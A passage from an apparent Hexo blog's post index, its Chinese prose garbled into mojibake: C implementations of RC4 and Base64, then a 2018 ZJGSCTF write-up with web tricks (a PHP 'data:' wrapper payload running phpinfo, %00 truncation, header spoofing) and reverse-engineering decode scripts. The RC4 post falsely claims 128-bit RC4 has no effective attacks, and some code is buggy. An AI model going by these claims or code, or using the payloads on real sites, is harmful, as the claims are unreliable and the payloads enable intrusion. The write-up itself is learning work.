å‚è€ƒç½‘ç«™ï¼šhttp://www.111cn.net/phper/apache/45642.htmhttp://smilejay.com/2012/10/apache-rewrite/https://www.cnblogs.com/zhenghongxin/p/6798310.htmlhttps://phperzh.com/articles/2922https://zybuluo.com/phper/note/73726","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://qianfei11.github.io/tags/web/"},{"name":"note","slug":"note","permalink":"https://qianfei11.github.io/tags/note/"}]},{"title":"Cè¯­è¨€å®ç°RC4åŠ å¯†è§£å¯†ç®—æ³•","slug":"Cè¯­è¨€å®ç°RC4åŠ å¯†è§£å¯†ç®—æ³•","date":"2018-05-13T02:47:11.000Z","updated":"2018-12-05T07:52:04.173Z","comments":true,"path":"2018/05/13/Cè¯­è¨€å®ç°RC4åŠ å¯†è§£å¯†ç®—æ³•/","link":"","permalink":"https://qianfei11.github.io/2018/05/13/Cè¯­è¨€å®ç°RC4åŠ å¯†è§£å¯†ç®—æ³•/","excerpt":"RC4äº1987å¹´æå‡ºï¼Œæ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨çš„å¯†é’¥ä¸ºå•é’¥ï¼ˆæˆ–ç§°ä¸ºç§é’¥ï¼‰ã€‚RC4ä¸æ˜¯å¯¹æ˜æ–‡è¿›è¡Œåˆ†ç»„å¤„ç†ï¼Œè€Œæ˜¯å­—èŠ‚æµçš„æ–¹å¼ä¾æ¬¡åŠ å¯†æ˜æ–‡ä¸­çš„æ¯ä¸€ä¸ªå­—èŠ‚ï¼Œè§£å¯†çš„æ—¶å€™ä¹Ÿæ˜¯ä¾æ¬¡å¯¹å¯†æ–‡ä¸­çš„æ¯ä¸€ä¸ªå­—èŠ‚è¿›è¡Œè§£å¯†ã€‚","text":"RC4äº1987å¹´æå‡ºï¼Œæ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨çš„å¯†é’¥ä¸ºå•é’¥ï¼ˆæˆ–ç§°ä¸ºç§é’¥ï¼‰ã€‚RC4ä¸æ˜¯å¯¹æ˜æ–‡è¿›è¡Œåˆ†ç»„å¤„ç†ï¼Œè€Œæ˜¯å­—èŠ‚æµçš„æ–¹å¼ä¾æ¬¡åŠ å¯†æ˜æ–‡ä¸­çš„æ¯ä¸€ä¸ªå­—èŠ‚ï¼Œè§£å¯†çš„æ—¶å€™ä¹Ÿæ˜¯ä¾æ¬¡å¯¹å¯†æ–‡ä¸­çš„æ¯ä¸€ä¸ªå­—èŠ‚è¿›è¡Œè§£å¯†ã€‚ RC4ç®—æ³•çš„ç‰¹ç‚¹æ˜¯ç®—æ³•ç®€å•ï¼Œè¿è¡Œé€Ÿåº¦å¿«ï¼Œè€Œä¸”å¯†é’¥é•¿åº¦æ˜¯å¯å˜çš„ï¼Œå¯å˜èŒƒå›´ä¸º1-256å­—èŠ‚(8-2048æ¯”ç‰¹)ï¼Œåœ¨å¦‚ä»ŠæŠ€æœ¯æ”¯æŒçš„å‰æä¸‹ï¼Œå½“å¯†é’¥é•¿åº¦ä¸º128æ¯”ç‰¹æ—¶ï¼Œç”¨æš´åŠ›æ³•æœç´¢å¯†é’¥å·²ç»ä¸å¤ªå¯è¡Œï¼Œæ‰€ä»¥å¯ä»¥é¢„è§RC4çš„å¯†é’¥èŒƒå›´ä»»ç„¶å¯ä»¥åœ¨ä»Šåç›¸å½“é•¿çš„æ—¶é—´é‡ŒæŠµå¾¡æš´åŠ›æœç´¢å¯†é’¥çš„æ”»å‡»ã€‚å®é™…ä¸Šï¼Œå¦‚ä»Šä¹Ÿæ²¡æœ‰æ‰¾åˆ°å¯¹äº128bitå¯†é’¥é•¿åº¦çš„RC4åŠ å¯†ç®—æ³•çš„æœ‰æ•ˆæ”»å‡»æ–¹æ³•ã€‚ RC4åŠ å¯†ç®—æ³•æ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ç®—æ³•ã€‚æ‰€è°“å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œè¯´å¾—ç›´ç™½ä¸€ç‚¹ï¼Œå°±æ˜¯åŠ å¯†ä¸è§£å¯†çš„è¿‡ç¨‹ä¸€æ¨¡ä¸€æ ·ã€‚å‡è®¾å®šä¹‰RC4çš„è¿ç®—è¿‡ç¨‹æ˜¯rc4(key,data)ï¼Œé‚£ä¹ˆï¼Œå¯†æ–‡=rc4(key,æ˜æ–‡)ï¼Œæ˜æ–‡=rc4(key,å¯†æ–‡)ã€‚æ‰€ä»¥ï¼Œå¯¹ä¸€æ®µæ•°æ®è¿­ä»£åœ°åšå¥‡æ•°æ¬¡RC4è¿ç®—ï¼Œå°±å¾—åˆ°å¯†æ–‡ï¼Œå¯¹è¿™æ®µæ•°æ®è¿­ä»£åœ°åšå¶æ•°æ¬¡RC4è¿ç®—ï¼Œç»“æœä¾æ—§æ˜¯åŸæ¥çš„é‚£æ®µæ•°æ®ã€‚ rc4åŠ å¯†è§£å¯†åŸç†å…ˆä»‹ç»ç®—æ³•ä¸­çš„å‡ ä¸ªå…³é”®å˜é‡ï¼š 1ã€å¯†é’¥æµï¼šRC4ç®—æ³•çš„å…³é”®æ˜¯æ ¹æ®æ˜æ–‡å’Œå¯†é’¥ç”Ÿæˆç›¸åº”çš„å¯†é’¥æµï¼Œå¯†é’¥æµçš„é•¿åº¦å’Œæ˜æ–‡çš„é•¿åº¦æ˜¯å¯¹åº”çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜æ–‡çš„é•¿åº¦æ˜¯500å­—èŠ‚ï¼Œé‚£ä¹ˆå¯†é’¥æµä¹Ÿæ˜¯500å­—èŠ‚ã€‚å½“ç„¶ï¼ŒåŠ å¯†ç”Ÿæˆçš„å¯†æ–‡ä¹Ÿæ˜¯500å­—èŠ‚ï¼Œå› ä¸ºå¯†æ–‡ç¬¬iå­—èŠ‚=æ˜æ–‡ç¬¬iå­—èŠ‚^å¯†é’¥æµç¬¬iå­—èŠ‚ï¼› 2ã€çŠ¶æ€å‘é‡Sï¼šé•¿åº¦ä¸º256ï¼ŒS[0],S[1]â€¦..S[255]ã€‚æ¯ä¸ªå•å…ƒéƒ½æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œç®—æ³•è¿è¡Œçš„ä»»ä½•æ—¶å€™ï¼ŒSéƒ½åŒ…æ‹¬0-255çš„8æ¯”ç‰¹æ•°çš„æ’åˆ—ç»„åˆï¼Œåªä¸è¿‡å€¼çš„ä½ç½®å‘ç”Ÿäº†å˜æ¢ï¼› 3ã€ä¸´æ—¶å‘é‡Tï¼šé•¿åº¦ä¹Ÿä¸º256ï¼Œæ¯ä¸ªå•å…ƒä¹Ÿæ˜¯ä¸€ä¸ªå­—èŠ‚ã€‚å¦‚æœå¯†é’¥çš„é•¿åº¦æ˜¯256å­—èŠ‚ï¼Œå°±ç›´æ¥æŠŠå¯†é’¥çš„å€¼èµ‹ç»™Tï¼Œå¦åˆ™ï¼Œè½®è½¬åœ°å°†å¯†é’¥çš„æ¯ä¸ªå­—èŠ‚èµ‹ç»™Tï¼› 4ã€å¯†é’¥Kï¼šé•¿åº¦ä¸º1-256å­—èŠ‚ï¼Œæ³¨æ„å¯†é’¥çš„é•¿åº¦keylenä¸æ˜æ–‡é•¿åº¦ã€å¯†é’¥æµçš„é•¿åº¦æ²¡æœ‰å¿…ç„¶å…³ç³»ï¼Œé€šå¸¸å¯†é’¥çš„é•¿åº¦è¶£å‘³16å­—èŠ‚ï¼ˆ128æ¯”ç‰¹ï¼‰ã€‚ åˆ©ç”¨Keyç”ŸæˆSç›’â€”â€”The key-scheduling algorithm (KSA)å¯†é’¥è°ƒåº¦ç®—æ³•ç”¨äºåˆå§‹åŒ–æ•°ç»„Sç›’ä¸­çš„ç½®æ¢ã€‚ â€œkeylengthâ€è¢«å®šä¹‰ä¸ºå¯†é’¥ä¸­çš„å­—èŠ‚æ•°ï¼Œå¹¶ä¸”å¯ä»¥åœ¨1â‰¤keylengthâ‰¤256çš„èŒƒå›´å†…ï¼Œé€šå¸¸åœ¨5å’Œ16ä¹‹é—´ï¼Œå¯¹åº”äº40åˆ°128ä½çš„å¯†é’¥é•¿åº¦ã€‚ é¦–å…ˆï¼Œæ•°ç»„â€œSâ€è¢«åˆå§‹åŒ–ä¸ºiã€‚ç„¶åä»¥ç±»ä¼¼äºPRGAçš„æ–¹å¼å¯¹Sè¿›è¡Œ256æ¬¡è¿­ä»£å¤„ç†ï¼ŒåŒæ—¶ä¹Ÿä»¥å¯†é’¥çš„å­—èŠ‚ä¸ºå•ä½è¿›è¡Œæ··åˆã€‚ åˆ©ç”¨Sç›’ç”Ÿæˆå¯†é’¥æµâ€”â€”The pseudo-random generation algorithm(PRGA)å¯¹äºéœ€è¦çš„è¿­ä»£æ¬¡æ•°ï¼ŒPRGAä¿®æ”¹çŠ¶æ€å¹¶è¾“å‡ºä¸€ä¸ªå­—èŠ‚çš„å¯†é’¥æµã€‚ åœ¨æ¯æ¬¡è¿­ä»£ä¸­ï¼ŒPRGAé€’å¢iï¼Œå°†iæŒ‡å‘çš„Sçš„å€¼ä¸jç›¸åŠ ï¼Œäº¤æ¢S[i]å’ŒS[j]çš„å€¼ï¼Œç„¶ååœ¨S[i]+S[j]ï¼ˆæ¨¡256ï¼‰ã€‚ æ¯256ä¸ªè¿­ä»£ï¼ŒSçš„æ¯ä¸ªå…ƒç´ è‡³å°‘ä¸å¦ä¸€ä¸ªå…ƒç´ äº¤æ¢ä¸€æ¬¡ã€‚ Code1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include&lt;cstdio&gt;#include&lt;cstdlib&gt;#include&lt;cstring&gt;#define MAX 256void rc4_init(unsigned char *sbox, unsigned char *key, unsigned long len)&#123; int j = 0; char t[MAX] = &#123;0&#125;; unsigned char tmp = 0; for(int i = 0; i &lt; MAX; i++)//åˆå§‹åŒ–ç®—æ³• &#123; sbox[i] = i; t[i] = key[i % len]; &#125; for(int i = 0; i &lt; MAX; i++)//ä¼ªéšæœºå­å¯†ç ç”Ÿæˆç®—æ³• &#123; j = (j + sbox[i] + t[i]) % MAX; tmp = sbox[i]; sbox[i] = sbox[j]; sbox[j] = tmp; &#125;&#125;unsigned char rc4_crypto(unsigned char *sbox, unsigned char *data, unsigned long len)&#123; int i = 0, j = 0; unsigned char tmp = 0; unsigned long k = 0; for(k = 0; k &lt; len; k++) &#123; i = (i + 1) % MAX; j = (j + sbox[i]) % MAX; tmp = sbox[i]; sbox[i] = sbox[j]; sbox[j] = tmp; int t = (sbox[i] + sbox[j]) % MAX; data[k] ^= sbox[t]; &#125;&#125;int main()&#123; unsigned char s1[MAX] = &#123;0&#125;, s2[MAX] = &#123;0&#125;; char key[MAX] = &#123;0&#125;, data[2 * MAX] = &#123;0&#125;; printf(&quot;Please input the key:\\n&quot;); scanf(&quot;%s&quot;, key); printf(&quot;Please input the data:\\n&quot;); scanf(&quot;%s&quot;, data); unsigned long len = strlen(data); rc4_init(s1, (unsigned char *)key, strlen(key)); for(int i = 0; i &lt; MAX; i++) s2[i] = s1[i]; rc4_crypto(s1, (unsigned char *)data, len); printf(&quot;%s\\n&quot;, data); rc4_crypto(s2, (unsigned char *)data, len); printf(&quot;%s\\n&quot;, data); return 0;&#125; å‚è€ƒç½‘ç«™ï¼šhttps://blog.csdn.net/white_idiot/article/details/65937877https://blog.csdn.net/lc_910927/article/details/37599161https://www.cnblogs.com/zibility/p/5404478.html","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://qianfei11.github.io/tags/crypto/"},{"name":"c","slug":"c","permalink":"https://qianfei11.github.io/tags/c/"}]},{"title":"Cè¯­è¨€å®ç°Base64è§£å¯†åŠ å¯†ç®—æ³•","slug":"Cè¯­è¨€å®ç°Base64è§£å¯†åŠ å¯†ç®—æ³•","date":"2018-05-12T03:49:45.000Z","updated":"2018-12-05T07:52:10.812Z","comments":true,"path":"2018/05/12/Cè¯­è¨€å®ç°Base64è§£å¯†åŠ å¯†ç®—æ³•/","link":"","permalink":"https://qianfei11.github.io/2018/05/12/Cè¯­è¨€å®ç°Base64è§£å¯†åŠ å¯†ç®—æ³•/","excerpt":"Base64ç¼–ç æ˜¯å°†ä»»ä½•ç±»å‹çš„æ•°æ®è½¬æ¢æˆASCIIç çš„å¯è§å­—ç¬¦ï¼Œç„¶åæ¥æ”¶ç«¯å†åå‘è§£ç ï¼Œå¾—åˆ°åŸå§‹çš„æ•°æ®ã€‚æœ€æ—©çš„çš„Baseæ˜¯ç”¨äºå‘é€Emailå†…å®¹çš„ã€‚","text":"Base64ç¼–ç æ˜¯å°†ä»»ä½•ç±»å‹çš„æ•°æ®è½¬æ¢æˆASCIIç çš„å¯è§å­—ç¬¦ï¼Œç„¶åæ¥æ”¶ç«¯å†åå‘è§£ç ï¼Œå¾—åˆ°åŸå§‹çš„æ•°æ®ã€‚æœ€æ—©çš„çš„Baseæ˜¯ç”¨äºå‘é€Emailå†…å®¹çš„ã€‚ Base64å®é™…ä¸Šæ˜¯ä¸€ç§åŸºäº64ä¸ªå¯æ‰“å°å­—ç¬¦æ¥è¡¨ç¤ºäºŒè¿›åˆ¶æ•°æ®çš„è¡¨ç¤ºæ–¹æ³•ã€‚ ç»è¿‡Base64è½¬æ¢ä¹‹åçš„æ•°æ®å¤§å°å˜å¤§äº†ï¼Œä¸ºåŸæ•°æ®çš„4/3å¤§å°ã€‚ä½†æ˜¯æ–¹ä¾¿äº†ä¼ è¾“ï¼Œæ¯”å¦‚ç”±äºbase64çš„ç¼–ç ä¸­æ²¡æœ‰&lt;&gt;ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œå¯ä»¥ä¸ç”¨è½¬ä¹‰æ‰«æï¼Œç›´æ¥æ”¾åœ¨XMLä¸­ï¼Œæ”¾åœ¨MIMEä¸­ï¼Œç”šè‡³ç›´æ¥ä¸ç»è¿‡è½¬ä¹‰æ‰«æå­˜è¿›æ•°æ®åº“ä¸­ã€‚ç”±äºæœ‰è¿™äº›æ–¹ä¾¿çš„ç‰¹æ€§ï¼Œå³ä½¿æ•°æ®é‡å˜å¤§ï¼Œbase64ç¼–ç è¿˜æ˜¯è¢«å¹¿æ³›ä½¿ç”¨ã€‚ ç¼–ç åŸç†æ¯ä¸ªå­—èŠ‚8ä½ï¼Œæ¯æ¬¡å–å‡º3ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯3 x 8 = 24 ä½ã€‚ç„¶åæ¯æ¬¡ä»æ­¤24ä½ä¸­å–å‡º6ä½ï¼Œç„¶ååœ¨å‰ç«¯è¡¥2ä½0ï¼Œç»„æˆæ–°çš„8ä½ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªå­—èŠ‚ã€‚è¿™æ ·å°±å°†3ä¸ªå­—èŠ‚è½¬æ¢æˆäº†4ä¸ªå­—èŠ‚ã€‚ç”±äºå‰é¢ä¸¤ä½éƒ½æ˜¯0ï¼Œæ‰€ä»¥è½¬æ¢åçš„æ¯ä¸ªå­—èŠ‚èƒ½è¡¨ç¤ºçš„æœ€å¤§æ•°å­—ä¸º63ï¼Œ ä¹Ÿå°±æ˜¯è¯´è½¬æ¢åçš„æ¯ä¸ªå­—èŠ‚åªå¯èƒ½æ˜¯0-63ä¸­çš„ä¸€ä¸ªæ•°å­—ã€‚ ç„¶åæ ¹æ®è§„èŒƒç»™å‡ºçš„Base64ç´¢å¼•è¡¨ï¼Œå°†1-63 è¿™64ä¸ªæ•°å­—è½¬æ¢æˆABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ä¸­çš„ä¸€ä¸ªã€‚ å½“æœ€åå–å‡º3ä¸ªå­—èŠ‚ä¸å¤Ÿæ—¶ï¼Œä¸å¤Ÿçš„ä½ç½®è¡¥0ï¼Œå¹¶ä¸”æœ€åå°‘ä¸€ä¸ªå­—èŠ‚æ—¶ç¼–ç çš„æœ€ååŠ ä¸€ä¸ªâ€œ=â€ï¼Œå°‘ä¸¤ä¸ªå­—èŠ‚æ—¶åŠ ä¸¤ä¸ªâ€=â€ã€‚ è§£ç åŸç†è§£ç æ˜¯ç¼–ç çš„åå‘è¿‡ç¨‹ï¼Œæ¯æ¬¡å–å‡º4ä¸ªå­—èŠ‚ï¼Œç„¶åå°†æ¯ä¸ªå­—èŠ‚çš„å­—ç¬¦è½¬æ¢æˆåŸå§‹Base64ç´¢å¼•è¡¨å¯¹åº”çš„ç´¢å¼•æ•°å­—ï¼Œä¹Ÿå°±æ˜¯ç¼–ç æ—¶3å­—èŠ‚è½¬æ¢æˆ4å­—èŠ‚çš„è½¬æ¢ç»“æœã€‚ç„¶åä½¿ç”¨ä½æ“ä½œå°†æ¯å­—èŠ‚å‰2ä½å»æ‰ï¼Œé‡æ–°è½¬æ¢æˆ3å­—èŠ‚ã€‚éœ€è¦æ³¨æ„çš„æ˜¯æœ€åå¯¹äºç»“å°¾â€œ=â€çš„å¤„ç†ã€‚ Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#include&lt;cstdio&gt;#include&lt;cstdlib&gt;#include&lt;cstring&gt;#define MAX 100const char *base64payload = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;;int find_pos(char c)&#123; for(int i = 0; i &lt; 65; i++) if(c == base64payload[i]) return i; return -1;&#125;unsigned char *base64_encode(const char *s, const int len)&#123; unsigned int sign = len % 3; unsigned int res_len = len % 3 ? ((len) / 3 + 1) * 4 : (len) / 3 * 4; unsigned int i = 0, j = 0; unsigned char *res = (unsigned char *)malloc(res_len + 1); memset(res, 0, res_len + 1); for(i = 0, j = 0; i &lt; len; i += 3, j += 4) &#123; if(i + 2 &gt;= len) &#123; res[j] = (s[i] &gt;&gt; 2) &amp; 0x3F; if(sign == 1)//å› ä¸ºåªå¤šå‡ºä¸€ä¸ªæ•°æ®ï¼Œæ•…éœ€è¦è¡¥ä¸¤ä¸ª&apos;=&apos; &#123; res[j + 1] = ((s[i] &amp; 0x03) &lt;&lt; 4) &amp; 0x3F; res[j + 2] = 0x40;//0x40å¯¹åº”æ•°å­—64ï¼Œå³ä¸ºbase64payloadä¸­ä¸‹æ ‡ä¸º64çš„&apos;=&apos; res[j + 3] = 0x40; &#125; else if(sign == 2)//å› ä¸ºå¤šå‡ºä¸¤ä¸ªæ•°æ®ï¼Œæ•…éœ€è¦è¡¥ä¸€ä¸ª&apos;=&apos; &#123; res[j + 1] = (((s[i] &amp; 0x03) &lt;&lt; 4) | ((s[i + 1] &gt;&gt; 4) &amp; 0x0F)); res[j + 2] = ((s[i + 1] &amp; 0x0F) &lt;&lt; 2) &amp; 0x3F; res[j + 3] = 0x40; break; &#125; &#125; res[j] = (s[i] &gt;&gt; 2) &amp; 0x3F;//å–ç¬¬ä¸€ä¸ªå­—èŠ‚çš„å‰å…­ä½ï¼Œæœ€é«˜ä¸¤ä½è¡¥é›¶ res[j + 1] = (((s[i] &amp; 0x03) &lt;&lt; 4) | ((s[i + 1] &gt;&gt; 4) &amp; 0x0F));//å–ç¬¬ä¸€ä¸ªå­—èŠ‚çš„æœ€åä¸¤ä½å’Œç¬¬äºŒä¸ªå­—èŠ‚çš„å‰å››ä½ï¼Œæœ€é«˜ä¸¤ä½è¡¥é›¶ res[j + 2] = (((s[i + 1] &amp; 0x0F) &lt;&lt; 2) | ((s[i + 2] &gt;&gt; 6) &amp; 0x03));//å–ç¬¬äºŒä¸ªå­—èŠ‚çš„åå››ä½å’Œç¬¬ä¸‰ä¸ªå­—èŠ‚çš„å‰ä¸¤ä½ï¼Œæœ€é«˜ä¸¤ä½è¡¥é›¶ res[j + 3] = (s[i + 2] &amp; 0x3F);//å–ç¬¬ä¸‰ä¸ªå­—èŠ‚çš„æœ€åå…­ä½ï¼Œæœ€é«˜ä¸¤ä½è¡¥é›¶ &#125; for(j = 0; j &lt; res_len; j++) res[j] = base64payload[res[j]]; return res;&#125;unsigned char *base64_decode(const char *s, const int len)&#123; unsigned int res_len = len / 4 * 3; unsigned int i = 0, j = 0; unsigned char *res = (unsigned char *)malloc(res_len + 1); memset(res, 0, res_len + 1); int count = len / 4; for(i = 0; i &lt; count; i++) &#123; int s_index = i * 4; int res_index = i * 3; int buffer[4];//å››ä¸ªå­—èŠ‚ä¸€ç»„å­˜å…¥ int sign = 0; for(j = 0; j &lt; 4; j++) buffer[j] = find_pos(s[s_index + j]); if(i == count - 1) for(j = 0; j &lt; 4; j++) if(buffer[j] == 0x40)//å¦‚æœä¸º&apos;=&apos;ï¼Œsignçš„å€¼åŠ ä¸€ sign++; res[res_index] = ((buffer[0] &amp; 0x3F) &lt;&lt; 2 | (buffer[1] &amp; 0x30) &gt;&gt; 4); if(sign == 2) break; res[res_index + 1] = ((buffer[1] &amp; 0x0f) &lt;&lt; 4 | (buffer[2] &amp; 0x3C) &gt;&gt; 2); if(sign == 1) break; res[res_index + 2] = ((buffer[2] &amp; 0x03) &lt;&lt; 6 | (buffer[3] &amp; 0x3F)); &#125; return res;&#125;int main()&#123; unsigned char s1[MAX]; scanf(&quot;%s&quot;, s1); unsigned char *s2 = base64_encode((const char *)s1, strlen((const char *)s1)); printf(&quot;%s\\n&quot;, s2); unsigned char *s3 = base64_decode((const char *)s2, strlen((const char *)s2)); printf(&quot;%s\\n&quot;, s3); free(s2); free(s3); return 0;&#125; é€šè¿‡å¯¹base64çš„å®ç°ï¼Œç†Ÿæ‚‰äº†å‡ ä¸ªä½è¿ç®—ç¬¦ï¼Œå¯¹äºŒè¿›åˆ¶çš„è®¤è¯†æ›´æ¸…æ™°äº†ä¸€äº›ã€‚ å‚è€ƒç½‘ç«™ï¼šhttps://blog.csdn.net/irwin_chen/article/details/9360845http://www.cppblog.com/izualzhy/archive/2012/07/19/184222.htmlhttp://www.cppblog.com/izualzhy/archive/2012/07/20/184311.html","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://qianfei11.github.io/tags/crypto/"},{"name":"c","slug":"c","permalink":"https://qianfei11.github.io/tags/c/"}]},{"title":"2018-ZJGSCTF-writeup","slug":"2018-ZJGSCTF-writeup","date":"2018-05-07T04:06:41.000Z","updated":"2019-02-03T10:19:06.587Z","comments":true,"path":"2018/05/07/2018-ZJGSCTF-writeup/","link":"","permalink":"https://qianfei11.github.io/2018/05/07/2018-ZJGSCTF-writeup/","excerpt":"ç¬¬ä¸€æ¬¡è¿ç»­è‚äº†ä¸¤å¤©çš„æ¯”èµ›ï¼ŒçœŸæ­£æ„Ÿå—åˆ°äº†æ¯”èµ›çš„æ°›å›´ï¼Œè¿˜æœ‰è¢«å¤§ä½¬å¸¦é£çš„æ„Ÿè§‰ï¼Œè®°å½•ä¸€ä¸‹ç®€å•çš„å‡ é“é¢˜ã€‚","text":"ç¬¬ä¸€æ¬¡è¿ç»­è‚äº†ä¸¤å¤©çš„æ¯”èµ›ï¼ŒçœŸæ­£æ„Ÿå—åˆ°äº†æ¯”èµ›çš„æ°›å›´ï¼Œè¿˜æœ‰è¢«å¤§ä½¬å¸¦é£çš„æ„Ÿè§‰ï¼Œè®°å½•ä¸€ä¸‹ç®€å•çš„å‡ é“é¢˜ã€‚ WEBå¥‡æ·«æŠ€å·§ç¬¬ä¸€å…³ï¼Œmd5ç¢°æ’ã€‚ ç¬¬äºŒå…³ï¼Œæ•°ç»„ç»•è¿‡ã€‚ ç¬¬ä¸‰å…³ï¼Œ%00æˆªæ–­ã€‚ ç¬¬å››å…³ï¼ŒPHPä¼ªåè®®data:text/plain,&lt;?php phpinfo()?&gt;ã€‚ï¼ˆé™„ä¸Šå¤§ä½¬åšå®¢ï¼‰ é€åˆ†çš„ç‚¹å‡»flag in hereåï¼Œè·³è½¬åˆ°å¦ä¸€ä¸ªç½‘ç«™ï¼Œæç¤ºä¸ºéæ³•æºæ— æ³•è®¿é—®ã€‚ æƒ³åˆ°X-Forwarded-Forå’ŒRefererï¼Œç»è¿‡å°è¯•å¾—åˆ°flagã€‚ ç»™ä½ çš„å°ä¸–ç•Œæ‰“å¼€ç½‘ç«™å…ˆæ¬£èµä¸€éç²¾å½©çš„å°æ•…äº‹ï¼Œç„¶åæŸ¥çœ‹æºç ï¼Œå¾—åˆ°æç¤ºã€‚ ç¬¬ä¸€æ®µå­—æ¯æ˜¾ç„¶æ˜¯base64ï¼Œç„¶åæ ¹æ®è§£ç åå¾—åˆ°çš„æç¤ºåˆ†åˆ«base32ã€base16è§£å¯†å¾—åˆ°flagã€‚ REREè¿™å—ä¸»è¦æ˜¯å¤ç°ã€‚ ç­¾åˆ°é¢˜å‘ç°é¢˜ç›®æ‰“ä¸å¼€ï¼ŒåŸæ¥æ˜¯æ–‡æœ¬æ–‡ä»¶ï¼Œæœ‰ä¸€æ®µCä»£ç å’Œæ±‡ç¼–ç»„æˆã€‚ å¯ä»¥åˆ¤æ–­ä¸‹é¢çš„æ±‡ç¼–ä»£ç å°±æ˜¯å‡½æ•°ck1()çš„æ±‡ç¼–å½¢å¼ã€‚å…·ä½“æ“ä½œä¹Ÿå¾ˆå®¹æ˜“çœ‹å‡ºï¼š 12345678910111213.text:0040104A loc_40104A: ; CODE XREF: ck1+1Fâ†‘j.text:0040104A mov ecx, [ebp+var_4].text:0040104D cmp ecx, [ebp+arg_4].text:00401050 jge short loc_40106B.text:00401052 mov edx, [ebp+arg_0].text:00401055 add edx, [ebp+var_4].text:00401058 movsx eax, byte ptr [edx].text:0040105B xor eax, 30h.text:0040105E add eax, 1.text:00401061 mov ecx, [ebp+arg_0].text:00401064 add ecx, [ebp+var_4].text:00401067 mov [ecx], al.text:00401069 jmp short loc_401041 å¯ä»¥çœ‹åˆ°å°±æ˜¯æŠŠencå­—ç¬¦ä¸²ä¸­çš„æ¯ä¸ªå­—ç¬¦åˆ†åˆ«å’Œ0x30å¼‚æˆ–åå†åŠ ä¸€ã€‚ åŠ å¯†è„šæœ¬ï¼ˆå®é™…ä¸Šå°±æ˜¯å¡«å……å‡½æ•°ck1()çš„å†…å®¹ï¼‰å¦‚ä¸‹ï¼š 1234567891011#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() &#123; char enc[37]=\"\\x55\\x5b\\x50\\x56\\x4a\\x66\\x54\\x5b\\x52\\x5e\\x5c\\x54\\x6e\\x43\\x1f\\x6e\\x41\\x54\\x6e\\x43\\x57\\x58\\x42\\x6e\\x58\\x42\\x6e\\x5e\\x5d\\x5b\\x48\\x6e\\x50\\x42\\x5c\\x4c\"; for(int i = 0; i &lt; strlen(enc); i++) &#123; enc[i] ^= 0x30; enc[i] += 1; &#125; printf(\"%s\\n\",enc); return 0;&#125; babyreè¿™é¢˜æ¶‰åŠåˆ°idaçš„ä¸€ä¸ªå°æŠ€å·§patchï¼Œé€šè¿‡çœ‹é›ªä¸Šçš„ä¸€ç¯‡æ–‡ç« äº†è§£äº†ä¸€ä¸‹ã€‚f5å‘ç°ä¸è¡Œï¼Œæ˜¾ç¤ºæ ˆä¸å¹³è¡¡ï¼Œéœ€è¦patchã€‚ å…ˆæ ¹æ®æç¤ºæ‰¾åˆ°å‡ºé”™çš„ä½ç½®ã€‚åœ¨optionä¸­å‹¾é€‰æ˜¾ç¤ºæ ˆæŒ‡é’ˆã€‚ç„¶åå†æ‰¾åˆ°è·ç¦»retæœ€è¿‘çš„callï¼Œç„¶åä¿®æ”¹æ ˆæŒ‡é’ˆçš„å€¼ã€‚ æˆåŠŸf5åå®¡è®¡ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435int __cdecl main(int argc, const char **argv, const char **envp)&#123; const char *enc1; // esi signed int v4; // eax int v5; // esi char sbox; // [esp+Ch] [ebp-238h] char Dst; // [esp+Dh] [ebp-237h] char key; // [esp+10Ch] [ebp-138h] char v10; // [esp+12Eh] [ebp-116h] char input[52]; // [esp+20Ch] [ebp-38h] sbox = 0; memset(&amp;Dst, 0, 0xFFu); strcpy(&amp;key, \"flag&#123;this_is_not_the_flag_hahaha&#125;\"); memset(&amp;v10, 0, 0xDEu); printf(\"input flag:\\n\"); scanf(\"%50s\", input); if ( strlen(input) == 33 ) &#123; enc1 = base64encypt(input); rc4_init(&amp;sbox, (int)&amp;key, strlen(&amp;key)); rc4_crypto((int)&amp;sbox, (int)enc1, strlen(enc1)); v4 = 0; v5 = enc1 - flag; do &#123; if ( flag[v5 + v4] != flag[v4] ) exit(0); ++v4; &#125; while ( v4 &lt; 44 ); printf(\"Congratulation!!!!!!\\n\"); &#125; return 0;&#125; ç»è¿‡å¯¹ä»£ç çš„å®¡è®¡ï¼Œåˆ¤æ–­å‡ºå…ˆå¯¹è¾“å…¥å­—ç¬¦ä¸²è¿›è¡Œäº†base64åŠ å¯†ï¼Œç„¶åå†é€šè¿‡rc4åŠ å¯†ã€‚åœ¨å†…å­˜ä¸­åˆ†åˆ«æ‰¾åˆ°base64çš„è¡¨ä»¥åŠè¢«åŠ å¯†çš„flagã€‚ ç”¨python2ä¸­çš„pycryptoï¼ˆä½¿ç”¨æ–¹æ³•ï¼šfrom Crypto.Cipherï¼‰è¿›è¡Œrc4çš„åŠ è§£å¯†ï¼›ç”¨base64åº“è¿›è¡Œbase64åŠ è§£å¯†ã€‚è„šæœ¬å¦‚ä¸‹ï¼š 123456789101112131415161718from Crypto.Cipher import ARC4import base64import stringprint '-----------------ARC4-----------------'key = 'flag&#123;this_is_not_the_flag_hahaha&#125;'flag = 